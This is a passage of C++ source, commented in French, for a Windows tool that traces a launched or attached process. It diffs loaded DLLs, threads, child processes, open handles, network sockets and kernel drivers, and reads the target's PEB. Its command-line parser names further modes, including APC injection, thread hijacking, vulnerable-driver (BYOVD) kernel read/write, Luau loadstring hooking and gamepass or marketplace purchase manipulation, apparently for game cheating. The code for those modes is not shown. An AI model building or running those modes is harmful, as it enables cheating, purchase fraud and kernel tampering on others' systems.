        std::wstring prefix = std::wstring(L"\\Device\\") + dev;
        if (_wcsnicmp(ntPath.c_str(), prefix.c_str(), prefix.size()) == 0)
            return std::wstring(root) + ntPath.substr(prefix.size());
    }
    return ntPath;
}

static std::wstring QueryObjectType(HANDLE h) {
    BYTE buf[0x800];
    ULONG len = 0;
    if (!g_NtQueryObject ||
        !MR_NT_SUCCESS(g_NtQueryObject(h, 2, buf, sizeof(buf), &len))) return {};
    MrUnicodeString* u = (MrUnicodeString*)buf;
    if (!u->Buffer || u->Length == 0) return {};
    uintptr_t off = (uintptr_t)u->Buffer - (uintptr_t)buf;
    if (off + u->Length > sizeof(buf)) return {};
    return std::wstring((const wchar_t*)(buf + off), u->Length / 2);
}

static std::wstring QueryObjectName(HANDLE h) {
    std::vector<BYTE> buf(0x20000);
    ULONG len = 0;
    if (!g_NtQueryObject ||
        !MR_NT_SUCCESS(g_NtQueryObject(h, 1, buf.data(), (ULONG)buf.size(), &len))) return {};
    MrUnicodeString* u = (MrUnicodeString*)buf.data();
    if (!u->Buffer || u->Length == 0) return {};
    uintptr_t off = (uintptr_t)u->Buffer - (uintptr_t)buf.data();
    if (off + u->Length > buf.size()) return {};
    return std::wstring((const wchar_t*)(buf.data() + off), u->Length / 2);
}

static std::string Ip4(DWORD addr, USHORT portNetOrder) {
    const unsigned char* b = (const unsigned char*)&addr;
    char tmp[64];
    sprintf(tmp, "%u.%u.%u.%u:%u", b[0], b[1], b[2], b[3],
            (portNetOrder >> 8) | (portNetOrder << 8));
    return tmp;
}

static const char* TcpState(DWORD s) {
    switch (s) {
        case 1: return "CLOSED";   case 2: return "LISTEN";
        case 3: return "SYN_SENT"; case 4: return "SYN_RCVD";
        case 5: return "ESTABLISHED"; case 6: return "FIN_WAIT1";
        case 7: return "FIN_WAIT2"; case 8: return "CLOSE_WAIT";
        case 9: return "CLOSING";  case 10: return "LAST_ACK";
        case 11: return "TIME_WAIT"; case 12: return "DELETE_TCB";
        default: return "?";
    }
}

static std::vector<std::pair<uintptr_t, std::pair<std::wstring, SIZE_T>>>
CollectModules(HANDLE proc) {
    std::vector<std::pair<uintptr_t, std::pair<std::wstring, SIZE_T>>> out;
    HMODULE mods[2048];
    DWORD cb = 0;
    if (!EnumProcessModulesEx(proc, mods, sizeof(mods), &cb, LIST_MODULES_ALL)) return out;
    DWORD cnt = cb / sizeof(HMODULE);
    for (DWORD i = 0; i < cnt && i < 2048; ++i) {
        MODULEINFO mi{};
        if (!GetModuleInformation(proc, mods[i], &mi, sizeof(mi))) continue;
        wchar_t path[1024];
        DWORD n = GetModuleFileNameExW(proc, mods[i], path, 1024);
        out.emplace_back((uintptr_t)mods[i],
                         std::make_pair(n ? std::wstring(path, n) : std::wstring(),
                                        mi.SizeOfImage));
    }
    return out;
}

static std::vector<DWORD> CollectThreads(DWORD pid) {
    std::vector<DWORD> out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return out;
    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    for (BOOL ok = Thread32First(snap, &te); ok; ok = Thread32Next(snap, &te))
        if (te.th32OwnerProcessID == pid) out.push_back(te.th32ThreadID);
    CloseHandle(snap);
    return out;
}

static std::unordered_map<DWORD, DWORD> SnapshotProcesses() {
    std::unordered_map<DWORD, DWORD> out;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return out;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe))
        out[pe.th32ProcessID] = pe.th32ParentProcessID;
    CloseHandle(snap);
    return out;
}

static bool IsDescendant(DWORD pid, DWORD ancestor,
                         const std::unordered_map<DWORD, DWORD>& procs) {
    for (int d = 0; d < 10; ++d) {
        auto it = procs.find(pid);
        if (it == procs.end() || it->second == 0 || it->second == it->first) return false;
        if (it->second == ancestor) return true;
        pid = it->second;
    }
    return false;
}

struct MrKernelMod { std::wstring path; uintptr_t base; size_t size; };

/* Liste les drivers loads (kernel) via NtQuerySystemInformation(SystemModuleInformation).
   Retour : 1 = OK, 0 = indisponible/erreur, -1 = acces refuse (elevation requise). */
static int CollectKernelModules(std::vector<MrKernelMod>& out) {
    out.clear();
    if (!g_NtQSI) return 0;

    ULONG need = 0;
    MR_NTSTATUS st = g_NtQSI(11, nullptr, 0, &need);
    if (st == MR_STATUS_ACCESS_DENIED) return -1;
    if (st != MR_STATUS_INFO_LENGTH_MISMATCH && !MR_NT_SUCCESS(st)) return 0;

    std::vector<BYTE> buf;
    for (int guard = 0; guard < 8; ++guard) {
        buf.assign(need > 0 ? (size_t)need : (size_t)(1u << 16), 0);
        st = g_NtQSI(11, buf.data(), (ULONG)buf.size(), &need);
        if (MR_NT_SUCCESS(st)) break;
        if (st != MR_STATUS_INFO_LENGTH_MISMATCH) return 0;
        if (need == 0 || need > (1u << 28)) return 0;
    }
    if (!MR_NT_SUCCESS(st)) return 0;

    struct MrSysMods { ULONG NumberOfModules; ULONG_PTR Reserved; };
    struct MrSysModInfo { PVOID Section; PVOID MappedBase; PVOID ImageBase;
                          ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex;
                          USHORT InitOrderIndex; USHORT LoadCount;
                          USHORT OffsetToFileName; BYTE FullPathName[256]; };
    if (buf.size() < sizeof(MrSysMods)) return 0;

    ULONG n = ((MrSysMods*)buf.data())->NumberOfModules;
    if (n > 255) n = 255;
    MrSysModInfo* mods = (MrSysModInfo*)((BYTE*)buf.data() + sizeof(MrSysMods));

    wchar_t sysroot[512] = { 0 };
    DWORD srLen = GetEnvironmentVariableW(L"SystemRoot", sysroot, 512);
    std::wstring sr = (srLen > 0) ? std::wstring(sysroot, srLen)
                                  : std::wstring(L"C:\\Windows");

    for (ULONG i = 0; i < n; ++i) {
        std::string img((const char*)mods[i].FullPathName, 256);
        img = img.c_str();
        if (img.empty()) continue;
        std::wstring w = A2W(img.c_str());
        if (w.rfind(L"\\SystemRoot\\", 0) == 0) w = sr + w.substr(12);
        out.emplace_back(MrKernelMod{ w, (uintptr_t)mods[i].ImageBase, mods[i].ImageSize });
    }
    return 1;
}

static void ScanOpenHandles(HANDLE proc, DWORD pid,
                            std::unordered_set<std::wstring>& seenFiles,
                            std::unordered_set<std::wstring>& seenKeys) {
    if (!g_NtQSI) return;
    ULONG size = 1u << 20;
    std::vector<BYTE> buf;
    MR_NTSTATUS st;
    for (int guard = 0; guard < 6; ++guard) {
        buf.resize(size);
        ULONG need = 0;
        st = g_NtQSI(64, buf.data(), (ULONG)buf.size(), &need);
        if (st != MR_STATUS_INFO_LENGTH_MISMATCH) break;
        size = size > (ULONG)(1u << 26) ? (ULONG)(1u << 26) : size * 2;
    }
    if (!MR_NT_SUCCESS(st)) return;
    MR_SYSTEM_HANDLE_INFORMATION_EX* info = (MR_SYSTEM_HANDLE_INFORMATION_EX*)buf.data();
    ULONG_PTR n = info->NumberOfHandles;
    for (ULONG_PTR i = 0; i < n; ++i) {
        const auto& h = info->Handles[i];
        if (h.UniqueProcessId != pid) continue;
        if ((ULONG_PTR)h.HandleValue == 0) continue;
        HANDLE dup = nullptr;
        if (!DuplicateHandle(proc, (HANDLE)h.HandleValue, GetCurrentProcess(),
                             &dup, 0, FALSE, DUPLICATE_SAME_ACCESS)) continue;
        std::wstring type = QueryObjectType(dup);
        std::wstring name;
        if (type == L"File" || type == L"Key") name = QueryObjectName(dup);
        if (type == L"File" && !name.empty() && seenFiles.insert(name).second)
            std::cout << "  [fichier ouvert] " << W2U8(NtToDosPath(name)) << '\n';
        else if (type == L"Key" && !name.empty() && seenKeys.insert(name).second)
            std::cout << "  [cle registre]   " << W2U8(name) << '\n';
        CloseHandle(dup);
    }
}

struct MrScanCtx { HANDLE proc; DWORD pid;
                   std::unordered_set<std::wstring>* files;
                   std::unordered_set<std::wstring>* keys; };
static DWORD WINAPI MrScanWorker(void* p) {
    MrScanCtx* c = (MrScanCtx*)p;
    ScanOpenHandles(c->proc, c->pid, *c->files, *c->keys);
    return 0;
}
// Certains objets (console d'une autre session, etc.) peuvent bloquer
// NtQueryObject pour toujours : le scan est borne (capMs) et abandonne
// proprement. Un thread bloque reste en arriere-plan ; on n'en relance pas.
static bool MrScanBounded(HANDLE proc, DWORD pid,
                          std::unordered_set<std::wstring>& files,
                          std::unordered_set<std::wstring>& keys, DWORD capMs) {
    MrScanCtx c{ proc, pid, &files, &keys };
    HANDLE th = CreateThread(nullptr, 0, MrScanWorker, &c, 0, nullptr);
    if (!th) return false;
    if (WaitForSingleObject(th, capMs) == WAIT_OBJECT_0) { CloseHandle(th); return true; }
    CloseHandle(th);
    return false;
}

static void ScanNetwork(DWORD pid, std::unordered_set<std::string>& seenConn) {
    ULONG size = 0;
    GetExtendedTcpTable(nullptr, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    std::vector<BYTE> tcp(size);
    if (GetExtendedTcpTable(tcp.data(), &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
        MIB_TCPTABLE_OWNER_PID* t = (MIB_TCPTABLE_OWNER_PID*)tcp.data();
        for (DWORD i = 0; i < t->dwNumEntries; ++i) {
            const MIB_TCPROW_OWNER_PID& r = t->table[i];
            if (r.dwOwningPid != pid) continue;
            std::string line = Ip4(r.dwLocalAddr, (USHORT)r.dwLocalPort) + " -> " +
                               Ip4(r.dwRemoteAddr, (USHORT)r.dwRemotePort) + " [" + TcpState(r.dwState) + "]";
            if (seenConn.insert(line).second) std::cout << "  [connexion TCP] " << line << '\n';
        }
    }
    size = 0;
    GetExtendedUdpTable(nullptr, &size, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0);
    std::vector<BYTE> udp(size);
    if (GetExtendedUdpTable(udp.data(), &size, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0) == NO_ERROR) {
        MIB_UDPTABLE_OWNER_PID* t = (MIB_UDPTABLE_OWNER_PID*)udp.data();
        for (DWORD i = 0; i < t->dwNumEntries; ++i) {
            const MIB_UDPROW_OWNER_PID& r = t->table[i];
            if (r.dwOwningPid != pid) continue;
            std::string line = Ip4(r.dwLocalAddr, (USHORT)r.dwLocalPort);
            if (seenConn.insert("U:" + line).second) std::cout << "  [socket UDP]     " << line << '\n';
        }
    }
}

static int RunStartupTrace(const std::vector<const char*>& positional,
                           int timeoutSec, bool keepAlive) {
    if (positional.empty()) {
        std::cerr << "Usage : MonNouvelApp.exe --trace <exe> [args...]\n";
        return 1;
    }
    std::wstring target = A2W(positional[0]);
    std::wstring path = ResolveExePath(target);
    if (path.empty() || GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "Fichier introuvable : " << positional[0] << '\n';
        return 1;
    }

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) { std::cerr << "ntdll introuvable\n"; return 1; }
    g_NtQSI = (decltype(g_NtQSI))GetProcAddress(ntdll, "NtQuerySystemInformation");
    g_NtQueryObject = (decltype(g_NtQueryObject))GetProcAddress(ntdll, "NtQueryObject");
    if (!g_NtQSI || !g_NtQueryObject) {
        std::cerr << "Fonctions ntdll indisponibles\n";
        return 1;
    }

    if (IsProcessElevated()) EnableDebugPrivilege();

    std::wstring cmdline = L"\"" + path + L"\"";
    for (size_t i = 1; i < positional.size(); ++i) cmdline += L" " + CmdQuote(A2W(positional[i]));

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::cout << "[trace] lancement suspendu : " << W2U8(path) << '\n';
    if (!CreateProcessW(nullptr, cmdline.data(), nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT,
                        nullptr, nullptr, &si, &pi)) {
        std::cerr << "CreateProcess a echoue : " << GetLastError() << '\n';
        return 1;
    }
    UniqueHandle hProc(pi.hProcess);
    UniqueHandle hThread(pi.hThread);
    const DWORD pid = pi.dwProcessId;
    std::cout << "[trace] PID " << pid << '\n';

    MrPebPart peb{};
    ULONG_PTR pebAddr = 0;
    {
        typedef MR_NTSTATUS (NTAPI* tNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        struct MrPbi { LONG ExitStatus; ULONG_PTR PebBaseAddress; ULONG_PTR AffinityMask;
                       LONG BasePriority; ULONG_PTR UniqueProcessId; ULONG_PTR InheritedFromUniqueProcessId; };
        auto pNtQIP = (tNtQIP)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
        if (pNtQIP) {
            MrPbi pbi{};
            if (MR_NT_SUCCESS(pNtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), nullptr)))
                pebAddr = pbi.PebBaseAddress;
        }
    }
    if (pebAddr) {
        SIZE_T rd = 0;
        if (ReadProcessMemory(hProc.get(), (LPCVOID)pebAddr, &peb, sizeof(peb), &rd) && rd == sizeof(peb)) {
            std::cout << "  [PEB] ImageBase          0x" << std::hex << peb.ImageBaseAddress << std::dec << '\n';
            if (peb.ProcessParameters) {
                MrProcParams pp{};
                SIZE_T r2 = 0;
                if (ReadProcessMemory(hProc.get(), (LPCVOID)peb.ProcessParameters, &pp, sizeof(pp), &r2)
                    && r2 == sizeof(pp)) {
                    const uintptr_t ppRemote = peb.ProcessParameters;
                    std::wstring cmd = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, CommandLine));
                    std::wstring img = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, ImagePathName));
                    std::wstring cwd = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, CurrentDirectory) + offsetof(MrCurDir, DosPath));
                    std::wstring dllpath = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, DllPath));
                    std::wstring winTitle = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, WindowTitle));
                    if (!cmd.empty())    std::cout << "  [CLI ligne de commande] " << W2U8(cmd) << '\n';
                    if (!img.empty())    std::cout << "  [chemin image]          " << W2U8(img) << '\n';
                    if (!cwd.empty())    std::cout << "  [repertoire courant]    " << W2U8(cwd) << '\n';
                    if (!dllpath.empty()) std::cout << "  [chemin de recherche DLL] " << W2U8(dllpath) << '\n';
                    if (!winTitle.empty()) std::cout << "  [titre de fenetre]     " << W2U8(winTitle) << '\n';
                    if (pp.Environment) {
                        std::vector<BYTE> env(65536);
                        SIZE_T r3 = 0;
                        DWORD nb = 0;
                        if (ReadProcessMemory(hProc.get(), (LPCVOID)pp.Environment, env.data(),
                                              (SIZE_T)env.size(), &r3)) {
                            const wchar_t* p = (const wchar_t*)env.data();
                            size_t words = r3 / sizeof(wchar_t);
                            size_t i = 0;
                            while (i < words && nb < 512) {
                                if (p[i] == 0) break;
                                ++nb;
                                while (i < words && p[i] != 0) ++i;
                                if (i < words) ++i;
                            }
                        }
                        std::cout << "  [variables d'env]       " << nb << '\n';
                    }
                }
            }
            if (peb.Ldr) {
                MrPebLdrData ldr{};
                SIZE_T r4 = 0;
                if (ReadProcessMemory(hProc.get(), (LPCVOID)peb.Ldr, &ldr, sizeof(ldr), &r4)
                    && r4 == sizeof(ldr) && ldr.Initialized) {
                    const uintptr_t listHead = peb.Ldr + offsetof(MrPebLdrData, InLoadOrderModuleList);
                    uintptr_t cur = ldr.InLoadOrderModuleList.Flink;
                    int count = 0;
                    std::cout << "  [modules deja en place]\n";
                    while (cur && cur != listHead && count < 96) {
                        MrLdrEntry e{};
                        SIZE_T r5 = 0;
                        if (!ReadProcessMemory(hProc.get(), (LPCVOID)cur, &e, sizeof(e), &r5) || r5 != sizeof(e))
                            break;
                        std::wstring name = ReadRemoteUnicode(hProc.get(), cur + offsetof(MrLdrEntry, BaseDllName));
                        std::wstring full = ReadRemoteUnicode(hProc.get(), cur + offsetof(MrLdrEntry, FullDllName));
                        std::cout << "    0x" << std::hex << e.DllBase << std::dec << "  "
                                  << W2U8(full.empty() ? name : full) << '\n';
                        cur = e.InLoadOrderLinks.Flink;
                        ++count;
                    }
                    std::cout << "    (total liste chargeur : " << count << " modules)\n";
                } else {
                    std::cout << "  [chargeur PEB] pas encore initialise (normal en suspend)\n";
                }
            }
        }
    } else {
        std::cout << "  [PEB] adresse non recuperable\n";
    }

    std::unordered_set<uintptr_t> seenMods;
    auto mods = CollectModules(hProc.get());
    for (const auto& m : mods) seenMods.insert(m.first);
    std::unordered_set<DWORD> seenThreads;
    for (DWORD t : CollectThreads(pid)) seenThreads.insert(t);
    std::unordered_map<DWORD, DWORD> baseProcs = SnapshotProcesses();
    std::unordered_set<DWORD> seenChildren;
    std::unordered_set<std::wstring> seenFiles, seenKeys;
    std::unordered_set<std::string> seenConn;
    std::unordered_set<uintptr_t> seenKern;
    std::vector<MrKernelMod> kernNow;
    int kernStatus = CollectKernelModules(kernNow);
    for (const auto& k : kernNow) seenKern.insert(k.base);
    if (kernStatus == 0)
        std::cout << "  [KERNEL] liste des modules noyau indisponible\n";
    else if (kernStatus < 0)
        std::cout << "  [KERNEL] admin requis pour lister les modules noyau\n";
    else
        std::cout << "  [KERNEL] " << kernNow.size() << " drivers deja charges\n";

    std::cout << "[trace] reprise du processus, surveillance " << timeoutSec << " s...\n";
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "ResumeThread a echoue : " << GetLastError() << '\n';
        TerminateProcess(hProc.get(), 1);
        return 1;
    }

    bool scanAlive = true;
    auto doTick = [&](int n) {
        auto modsNow = CollectModules(hProc.get());
        for (const auto& m : modsNow)
            if (seenMods.insert(m.first).second)
                std::cout << "  [DLL chargee]  0x" << std::hex << m.first << std::dec << "  "
                          << W2U8(m.second.first) << "  (" << m.second.second << " o)\n";

        for (DWORD t : CollectThreads(pid))
            if (seenThreads.insert(t).second && t != pi.dwThreadId)
                std::cout << "  [thread cree]  TID " << t << '\n';

        auto procs = SnapshotProcesses();
        for (const auto& kv : procs)
            if (!baseProcs.count(kv.first) &&
                IsDescendant(kv.first, pid, procs) &&
                seenChildren.insert(kv.first).second)
                std::cout << "  [processus enfant] PID " << kv.first
                          << " (ppid " << kv.second << ")\n";

        if (n % 3 == 0) {
            if (scanAlive && !MrScanBounded(hProc.get(), pid, seenFiles, seenKeys, 1500)) {
                std::cout << "  [trace] scan des handles bloque, ignore pour la suite\n";
                scanAlive = false;
            }
            ScanNetwork(pid, seenConn);
            int ks = CollectKernelModules(kernNow);
            if (ks > 0)
                for (const auto& k : kernNow)
                    if (seenKern.insert(k.base).second)
                        std::cout << "  [KERNEL module] charge : " << W2U8(k.path)
                                  << "  base=0x" << std::hex << k.base << std::dec
                                  << "  taille=0x" << std::hex << k.size << std::dec << '\n';
        }
    };
    doTick(1);

    DWORD endTick = GetTickCount() + (DWORD)timeoutSec * 1000u;
    int ticks = 0;
    bool exited = false;
    while (GetTickCount() < endTick) {
        DWORD wait = WaitForSingleObject(hProc.get(), 200);
        if (wait == WAIT_OBJECT_0) {
            DWORD code = 0;
            GetExitCodeProcess(hProc.get(), &code);
            std::cout << "[trace] le processus s'est termine de lui-meme (code " << code << ")\n";
            exited = true;
            break;
        }
        if (wait == WAIT_FAILED) break;
        doTick(++ticks);
    }

    if (!exited) {
        if (keepAlive) {
            std::cout << "[trace] fin de la fenetre, processus laisse en vie (PID " << pid << ")\n";
        } else {
            TerminateProcess(hProc.get(), 0);
            std::cout << "[trace] fin de la fenetre, processus arrete (PID " << pid << ")\n";
        }
    }
    WaitForSingleObject(hProc.get(), 3000);
    return 0;
}

static int AttachTrace(DWORD pid, int timeoutSec) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) { std::cerr << "ntdll introuvable\n"; return 1; }
    g_NtQSI = (decltype(g_NtQSI))GetProcAddress(ntdll, "NtQuerySystemInformation");
    g_NtQueryObject = (decltype(g_NtQueryObject))GetProcAddress(ntdll, "NtQueryObject");
    if (!g_NtQSI || !g_NtQueryObject) {
        std::cerr << "Fonctions ntdll indisponibles\n";
        return 1;
    }
    if (IsProcessElevated()) EnableDebugPrivilege();

    HANDLE hRaw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hRaw)
        hRaw = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION |
                           PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hRaw) {
        std::cerr << "Impossible d'ouvrir le processus " << pid
                  << " (erreur " << GetLastError() << ")\n";
        return 1;
    }
    UniqueHandle hProc(hRaw);
    std::cout << "[trace-attach] cible PID " << pid << '\n';

    ULONG_PTR pebAddr = 0;
    {
        typedef MR_NTSTATUS (NTAPI* tNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        struct MrPbi { LONG ExitStatus; ULONG_PTR PebBaseAddress; ULONG_PTR AffinityMask;
                       LONG BasePriority; ULONG_PTR UniqueProcessId; ULONG_PTR InheritedFromUniqueProcessId; };
        auto pNtQIP = (tNtQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
        if (pNtQIP) {
            MrPbi pbi{};
            if (MR_NT_SUCCESS(pNtQIP(hProc.get(), 0, &pbi, sizeof(pbi), nullptr))) {
                pebAddr = pbi.PebBaseAddress;
                std::cout << "  [PEB] parent            " << pbi.InheritedFromUniqueProcessId << '\n';
            }
        }
    }

    auto mods = CollectModules(hProc.get());
    std::unordered_set<uintptr_t> seenMods;
    for (const auto& m : mods) seenMods.insert(m.first);
    std::cout << "  [modules deja en place] " << mods.size() << '\n';

    if (pebAddr) {
        MrPebPart peb{};
        SIZE_T rd = 0;
        if (ReadProcessMemory(hProc.get(), (LPCVOID)pebAddr, &peb, sizeof(peb), &rd) && rd == sizeof(peb)
            && peb.ProcessParameters) {
            MrProcParams pp{};
            SIZE_T r2 = 0;
            if (ReadProcessMemory(hProc.get(), (LPCVOID)peb.ProcessParameters, &pp, sizeof(pp), &r2)
                && r2 == sizeof(pp)) {
                const uintptr_t ppRemote = peb.ProcessParameters;
                std::wstring cmd = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, CommandLine));
                std::wstring img = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, ImagePathName));
                std::wstring cwd = ReadRemoteUnicode(hProc.get(), ppRemote + offsetof(MrProcParams, CurrentDirectory) + offsetof(MrCurDir, DosPath));
                if (!cmd.empty()) std::cout << "  [CLI ligne de commande] " << W2U8(cmd) << '\n';
                if (!img.empty()) std::cout << "  [chemin image]          " << W2U8(img) << '\n';
                if (!cwd.empty()) std::cout << "  [repertoire courant]    " << W2U8(cwd) << '\n';
            }
        }
    }

    std::unordered_set<DWORD> seenThreads;
    for (DWORD t : CollectThreads(pid)) seenThreads.insert(t);
    std::unordered_map<DWORD, DWORD> baseProcs = SnapshotProcesses();
    std::unordered_set<DWORD> seenChildren;
    std::unordered_set<std::wstring> seenFiles, seenKeys;
    std::unordered_set<std::string> seenConn;
    std::unordered_set<uintptr_t> seenKern;
    std::vector<MrKernelMod> kernNow;
    int kernStatus = CollectKernelModules(kernNow);
    for (const auto& k : kernNow) seenKern.insert(k.base);
    if (kernStatus == 0)
        std::cout << "  [KERNEL] liste des modules noyau indisponible\n";
    else if (kernStatus < 0)
        std::cout << "  [KERNEL] admin requis pour lister les modules noyau\n";
    else
        std::cout << "  [KERNEL] " << kernNow.size() << " drivers deja charges\n";

    std::cout << "[trace-attach] surveillance " << timeoutSec
              << " s (diff modules/threads/processus/fichiers/clefs/reseau/noyau)...\n";

    bool scanAlive = true;
    auto doTick = [&](int n) {
        auto modsNow = CollectModules(hProc.get());
        for (const auto& m : modsNow)
            if (seenMods.insert(m.first).second)
                std::cout << "  [DLL chargee]  0x" << std::hex << m.first << std::dec << "  "
                          << W2U8(m.second.first) << "  (" << m.second.second << " o)\n";

        for (DWORD t : CollectThreads(pid))
            if (seenThreads.insert(t).second)
                std::cout << "  [thread cree]  TID " << t << '\n';

        auto procs = SnapshotProcesses();
        for (const auto& kv : procs)
            if (!baseProcs.count(kv.first) &&
                IsDescendant(kv.first, pid, procs) &&
                seenChildren.insert(kv.first).second)
                std::cout << "  [processus enfant] PID " << kv.first
                          << " (ppid " << kv.second << ")\n";

        if (n % 3 == 0) {
            if (scanAlive && !MrScanBounded(hProc.get(), pid, seenFiles, seenKeys, 1500)) {
                std::cout << "  [trace-attach] scan des handles bloque, ignore pour la suite\n";
                scanAlive = false;
            }
            ScanNetwork(pid, seenConn);
            int ks = CollectKernelModules(kernNow);
            if (ks > 0)
                for (const auto& k : kernNow)
                    if (seenKern.insert(k.base).second)
                        std::cout << "  [KERNEL module] charge : " << W2U8(k.path)
                                  << "  base=0x" << std::hex << k.base << std::dec
                                  << "  taille=0x" << std::hex << k.size << std::dec << '\n';
        }
    };
    doTick(1);

    DWORD endTick = GetTickCount() + (DWORD)timeoutSec * 1000u;
    int ticks = 0;
    bool exited = false;
    while (GetTickCount() < endTick) {
        DWORD wait = WaitForSingleObject(hProc.get(), 200);
        if (wait == WAIT_OBJECT_0) {
            DWORD code = 0;
            GetExitCodeProcess(hProc.get(), &code);
            std::cout << "[trace-attach] le processus cible s'est termine (code " << code << ")\n";
            exited = true;
            break;
        }
        if (wait == WAIT_FAILED) break;
        doTick(++ticks);
    }

    if (!exited)
        std::cout << "[trace-attach] fin de la fenetre de surveillance\n";
    return 0;
}
#endif

#ifdef _WIN32
// Moteur NightShift (nuit C), voir src\nightshift_bridge.c + C:\client_simulator\nightshift
extern "C" {
#include "nightshift.h"
int ns_app_run_chain(NSContext* ctx, const char* input);
int ns_app_repl(NSContext* ctx);
}
#endif
int main(int argc, char** argv) {
    bool demo = false;
    bool hookDemo = false;
    bool iatDemo = false;
    bool vmtDemo = false;
    bool luauVm = false;
    bool loadstringHook = false;
    bool survivor = false;
    bool apc = false;
    bool hijack = false;
    bool marketplace = false;
    bool gamepass = false;
    bool devproduct = false;
    bool detect = false;
    bool sigUpdate = false;
    bool autoFix = false;
    bool probeThread = false;
    bool probeHijack = false;
    bool byovd = false;
    bool hijackByovd = false;
    bool readOnly = false;
    bool buyGamepass = false;
    bool buyDevProduct = false;
    bool buyMarketplace = false;
    bool buyProbe = false;
    bool byovdSiv = false;
    bool sivLoad = false;
    bool sivRemove = false;
    bool sivRead = false;
    bool sivWrite = false;
    bool snyperRecord = false;
    bool snyperPlay = false;
    bool snyperDryrun = false;
    bool snyperLoop = false;
    bool simGet = false;
    bool simPost = false;
    bool simPut = false;
    bool simDel = false;
    bool simPurchase = false;
    bool traceMode = false;
    bool traceKeep = false;
    int  traceTimeoutSec = 5;
    int  traceAttachPid = 0;
    bool gatewayMode = false;
    int  gatewayPort = 7080;
    bool nsChainMode = false;
    bool nsBatchMode = false;
    bool nsReplMode = false;
    std::string nsChainArg;
    std::string nsBatchArg;
    bool ghidraMode = false;
    bool ghidraHelp = false;
    std::vector<std::string> ghidraArgs;
    DWORD snyperPid = 0;
    bool mockSet = false;
    std::string mockStage = "all";
    mockgen::Options mockOpt;
    std::vector<const char*> positional;
    for (int i = 1; i < argc; ++i) {
        std::string_view arg = argv[i];
        if (arg == "--demo")                           demo = true;
        else if (arg == "--hook-demo")                 hookDemo = true;
        else if (arg == "--iat-demo")                  iatDemo = true;
        else if (arg == "--vmt-demo")                  vmtDemo = true;
        else if (arg == "--luau-vm")                   luauVm = true;
        else if (arg == "--loadstring")                loadstringHook = true;
        else if (arg == "--survivor")                  survivor = true;
        else if (arg == "--apc")                      apc = true;
        else if (arg == "--hijack")                   hijack = true;
        else if (arg == "--marketplace")              marketplace = true;
        else if (arg == "--gamepass")                 gamepass = true;
        else if (arg == "--devproduct")               devproduct = true;
        else if (arg == "--detect")                   detect = true;
        else if (arg == "--sig-update")               sigUpdate = true;
        else if (arg == "--autofix")                  autoFix = true;
        else if (arg == "--probe-thread")             probeThread = true;
        else if (arg == "--probe-hijack")             probeHijack = true;
        else if (arg == "--byovd")                  byovd = true;
        else if (arg == "--hijack-byovd")           hijackByovd = true;
        else if (arg == "--byovd-siv")              byovdSiv = true;
        else if (arg == "--siv-load")               sivLoad = true;
        else if (arg == "--siv-remove")             sivRemove = true;
        else if (arg == "--siv-read")               sivRead = true;
        else if (arg == "--siv-write")              sivWrite = true;
        else if (arg == "--snyper-record")            snyperRecord = true;
        else if (arg == "--snyper-play")              snyperPlay = true;
        else if (arg == "--snyper-dryrun")            snyperDryrun = true;
        else if (arg == "--loop")                     snyperLoop = true;
        else if (arg == "--sim-get")                  simGet = true;
        else if (arg == "--sim-post")                 simPost = true;
        else if (arg == "--sim-put")                  simPut = true;
        else if (arg == "--sim-del")                  simDel = true;
        else if (arg == "--sim-purchase")             simPurchase = true;
        else if (arg == "--gateway") {
            // Passerelle de test HTTPS (comme ltg.exe) : --gateway [port]
            gatewayMode = true;
            if (i + 1 < argc) {
                std::string_view n = argv[i + 1];
                bool digits = !n.empty() &&
                              std::all_of(n.begin(), n.end(),
                                          [](char c) { return c >= '0' && c <= '9'; });
                if (digits) gatewayPort = std::atoi(argv[++i]);
            }
        }
        else if (arg == "--sandbox" || arg == "--test-mode") {
            g_sandbox_mode.store(true, std::memory_order_relaxed);
            std::cout << "[SANDBOX MODE ACTIVE] Network mocking — all HTTP endpoints "
                         "redirected to localhost:8080 via resolve_endpoint()\n";
        }
        else if (arg == "--pid") {
            if (i + 1 < argc) snyperPid = (DWORD)std::strtoul(argv[++i], nullptr, 0);
        }
        else if (arg == "--proxy") {
            if (i + 1 >= argc) {
